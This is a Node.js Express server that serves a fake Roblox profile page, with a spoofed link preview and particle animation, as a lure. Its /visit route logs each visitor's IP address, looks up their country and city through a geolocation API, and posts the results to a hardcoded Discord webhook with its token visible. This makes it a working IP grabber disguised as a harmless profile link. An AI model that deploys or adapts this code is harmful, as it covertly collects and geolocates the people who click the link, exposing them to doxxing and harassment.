const express = require('express');
const app = express();
const fetch = require('node-fetch');

app.get('/roll-dice', (req, res) => {
    const roll = Math.floor(Math.random() * 6) + 1;
    res.send(`You rolled a ${roll}`);
});

app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <meta property='og:title' content="アルモシュ's Profile" />
    <meta property='og:description' content="アルモシュ is one of the millions creating and exploring the endless possibilities of Roblox. Join アルモシュ on Roblox and explore together!" />
    <meta property='og:image' content='https://tr.rbxcdn.com/30DAY-Avatar-B8D0CD7D3686FB6F74342DF497695029-Png/352/352/Avatar/Webp/noFilter' />
    <meta property='og:url' content='https://yourdomain.com/' />
    <meta name='theme-color' content='#808080'>
    <title>アルモシュ's Profile</title>
    <style>
        html, body { height: 100%; margin: 0; padding: 0; }
        body {
            background: #111;
            color: #fff;
            font-family: 'Segoe UI', Arial, sans-serif;
            min-height: 100vh;
            overflow: hidden;
        }
        .content {
            position: relative;
            z-index: 2;
            text-align: center;
            top: 30vh;
        }
        canvas#bg {
            position: fixed;
            top: 0; left: 0; width: 100vw; height: 100vh;
            z-index: 1;
            display: block;
        }
        h1 {
            font-size: 2.5rem;
            margin-bottom: 0.5rem;
        }
        p {
            font-size: 1.2rem;
            color: #ccc;
        }
    </style>
</head>
<body>
    <canvas id="bg"></canvas>
    <div class="content">
        <h1>アルモシュ's Profile</h1>
        <p>アルモシュ is one of the millions creating and exploring the endless possibilities of Roblox. Join アルモシュ on Roblox and explore together!</p>
    </div>
    <script>
    const canvas = document.getElementById('bg');
    const ctx = canvas.getContext('2d');
    let w, h;
    function resize() {
        w = canvas.width = window.innerWidth;
        h = canvas.height = window.innerHeight;
    }
    window.addEventListener('resize', resize);
    resize();
    const dots = Array.from({length: 60}, () => ({
        x: Math.random() * w,
        y: Math.random() * h,
        vx: (Math.random() - 0.5) * 1.2,
        vy: (Math.random() - 0.5) * 1.2
    }));
    function draw() {
        ctx.clearRect(0, 0, w, h);
        for (let i = 0; i < dots.length; i++) {
            for (let j = i + 1; j < dots.length; j++) {
                const dx = dots[i].x - dots[j].x;
                const dy = dots[i].y - dots[j].y;
                const dist = Math.sqrt(dx*dx + dy*dy);
                if (dist < 140) {
                    ctx.strokeStyle = 'rgba(200,200,255,' + (1 - dist/140) + ')';
                    ctx.lineWidth = 1;
                    ctx.beginPath();
                    ctx.moveTo(dots[i].x, dots[i].y);
                    ctx.lineTo(dots[j].x, dots[j].y);
                    ctx.stroke();
                }
            }
        }
        for (const dot of dots) {
            ctx.beginPath();
            ctx.arc(dot.x, dot.y, 3, 0, 2 * Math.PI);
            ctx.fillStyle = '#fff';
            ctx.shadowColor = '#6cf';
            ctx.shadowBlur = 8;
            ctx.fill();
            ctx.shadowBlur = 0;
        }
        for (const dot of dots) {
            dot.x += dot.vx;
            dot.y += dot.vy;
            if (dot.x < 0 || dot.x > w) dot.vx *= -1;
            if (dot.y < 0 || dot.y > h) dot.vy *= -1;
        }
        requestAnimationFrame(draw);
    }
    draw();
    </script>
</body>
</html>`);
});

app.get('/visit', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    let geo = { country: 'Unknown', city: 'Unknown', countryCode: '' };
    try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
        geo = await geoRes.json();
    } catch (e) {}
    const countryFlag = geo.countryCode ? String.fromCodePoint(...[...geo.countryCode.toUpperCase()].map(c => 0x1F1E6 - 65 + c.charCodeAt())) : '';
    
    const webhookUrl = 'https://discordapp.com/api/webhooks/1368358386571280435/kLO9BC2RFtV8M0lkCz57upHFFgcmDlllpn8OUM-jnFLOT9OZPi31SafXHikeg5yTGYnn';
    
    const payload = {
        username: 'Visit Notifier - Exiled',
        embeds: [{
            title: 'Link Clicked',
            color: 10038562,
            description: `IP: **${ip}** 🌍\nCountry: **${geo.country}** ${countryFlag}\nCity: **${geo.city}** 🏙️`
        }]
    };
    
    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error('Failed to send webhook:', e);
    }
    res.send(`<h2>Logged!</h2>`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('Server running on port ' + PORT);
});

